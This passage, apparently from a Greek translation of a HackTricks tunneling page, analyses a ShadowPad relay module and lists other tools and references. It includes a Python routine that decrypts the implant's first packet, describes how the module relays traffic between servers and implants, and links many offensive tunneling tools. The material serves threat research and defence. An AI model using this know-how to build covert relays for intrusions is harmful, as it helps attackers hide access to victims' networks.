* **Κρυπτογραφημένο πρώτο packet** – τα δύο πρώτα bytes του σώματος του request περιέχουν το seed για έναν προσαρμοσμένο PRNG 32-bit. Κάθε επόμενο byte γίνεται XOR με το παραγόμενο keystream πριν από την ανάλυση του πρωτοκόλλου:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Ενορχήστρωση relay** – η μονάδα διατηρεί δύο λίστες: «servers» (κόμβοι ανάντη) και «clients» (implants κατάντη). Οι εγγραφές αφαιρούνται αν δεν ληφθεί heartbeat μέσα σε περίπου 30 δευτερόλεπτα. Όταν και οι δύο λίστες δεν είναι κενές, αντιστοιχίζει τον πρώτο υγιή server με τον πρώτο υγιή client και προωθεί απλώς τα bytes μεταξύ των sockets τους, μέχρι να κλείσει η σύνδεση από τη μία πλευρά.
* **Τηλεμετρία αποσφαλμάτωσης** – η προαιρετική καταγραφή αποθηκεύει τη διεύθυνση IP προέλευσης, τη διεύθυνση IP προορισμού και τα συνολικά bytes που προωθήθηκαν για κάθε αντιστοίχιση. Οι ερευνητές χρησιμοποίησαν αυτά τα ίχνη για να ανασυνθέσουν το mesh του ShadowPad που εκτεινόταν σε πολλά θύματα.

---

## Άλλα εργαλεία προς έλεγχο

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Απόκρυψη στις σκιές: Κρυφά tunnels μέσω εικονικοποίησης QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Πριν από το ToolShell: Εξερευνώντας τις προηγούμενες επιχειρήσεις ransomware του Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Μέσα στο Ink Dragon: Αποκαλύπτοντας το δίκτυο relay και την εσωτερική λειτουργία μιας διακριτικής επιθετικής επιχείρησης](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [README του Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Οδηγός αναφοράς του Nmap: Παράκαμψη περιορισμών firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Εγχειρίδιο ssh του OpenBSD](https://man.openbsd.org/ssh)
- [7] [Εγχειρίδιο sshd_config του OpenBSD](https://man.openbsd.org/sshd_config)
- [8] [Σημειώσεις έκδοσης του OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [README του sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting στο Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Τεκμηρίωση της μονάδας socks_proxy του Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Τεκμηρίωση της μονάδας autoroute του Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [README του reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [README του Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng: Γρήγορη εκκίνηση](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng: Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng: Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [README του rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Εγχειρίδιο του socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Εγχειρίδιο του PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Επιλογές γραμμής εντολών του PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Εντολή netsh interface portproxy της Microsoft](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [README του SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Τεκμηρίωση του Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Κανόνες Proxification του Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Εγχειρίδιο του OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [README του YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [README του iodine](https://code.kryo.se/iodine/README.html)
- [32] [README του dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [README του dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [README του proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Ονόματα τομέων - Υλοποίηση και προδιαγραφές](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [README του ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [Διεπαφή επιθεώρησης ιστού του ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Εικονικοί hosts του ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Ρύθμιση παραμέτρων v2 του ngrok Agent](https://ngrok.com/docs/agent/config/v2)
- [43] [Επισκόπηση του Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Παράμετροι origin του Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Ρύθμιση του Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Αρχείο ρυθμίσεων του Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Παράμετροι εκτέλεσης του Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Έννοιες του frp](https://gofrp.org/en/docs/concepts/)
- [49] [XTCP του frp](https://gofrp.org/en/docs/features/xtcp/)
- [50] [Πύλη SSH Tunnel του frp](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Τεκμηρίωση δικτύωσης του QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [README του wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Αποθετήριο πηγαίου κώδικα του NetSPI BOFScale](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: Tailnet με CDN μπροστά, από ένα BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Εντολές CLI του Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT: GhostContainer και tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - Η πίσω πόρτα ClingSTUN για Linux κάνει κατάχρηση δημόσιας υποδομής STUN](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - Βοηθητικά εργαλεία διέλευσης συνεδριών μέσω NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - Απαιτήσεις συμπεριφοράς NAT για unicast UDP](https://www.rfc-editor.org/rfc/rfc4787.html)
- [62] [README του Tailcat](https://github.com/tailscale/tailcat/blob/main/README.md)
- [63] [Malwarebytes - Το malware Kothamine χρησιμοποιεί το tailcat του Tailscale για να αποφεύγει τον εντοπισμό στο δίκτυο](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
{{#include ../banners/hacktricks-training.md}}
